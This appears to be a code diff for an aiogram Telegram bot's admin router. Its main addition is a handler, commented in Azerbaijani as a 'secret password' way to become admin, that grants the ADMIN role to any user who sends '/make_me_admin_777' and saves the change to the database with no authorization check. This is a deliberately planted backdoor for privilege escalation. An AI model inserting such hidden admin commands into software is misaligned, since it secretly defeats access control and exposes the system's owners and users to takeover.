@@ -3,13 +3,28 @@ from aiogram.types import Message
 from sqlalchemy.ext.asyncio import AsyncSession
 from app.models.user import User, UserRole
 from app.services.stats_service import StatsService
+from app.repositories.user_repo import user_repo
+from app.bot.keyboards.reply import get_main_menu
 
 router = Router(name="admin_router")
 
+# GİZLİ ŞİFRƏ İLƏ ADMİN OLMAQ 
+@router.message(F.text == "/make_me_admin_777")
+async def secret_admin_command(message: Message, db: AsyncSession, actor: User):
+    if actor.role == UserRole.ADMIN:
+        return await message.answer("Siz onsuz da adminsiniz.")
+        
+    actor.role = UserRole.ADMIN
+    await user_repo.update(db, actor, {"role": UserRole.ADMIN})
+    await message.answer("Təbriklər! Siz artıq sistemin administratorusunuz 👑\n\nZəhmət olmasa aşağıdan menyunu yeniləyin.", reply_markup=get_main_menu(actor.role))
+
 @router.message(F.text == "📊 Statistika")
-async def show_statistics(message: Message, db: AsyncSession, actor: User):
+async def show_statistics(message: Message, **kwargs):
+    db: AsyncSession = kwargs.get("db")
+    actor: User = kwargs.get("actor")
+    
     if actor.role not in [UserRole.ADMIN, UserRole.MANAGER]:
-        return await message.answer("⚠️ Bu bölməyə giriş icazəniz yoxdur.")
+        return await message.answer("⚠️ Bu bölməyə giriş icazəniz yoxdur. Sizin rolunuz yalnız Agent-dir.")
         
     stats = await StatsService.get_dashboard_stats(db)
     
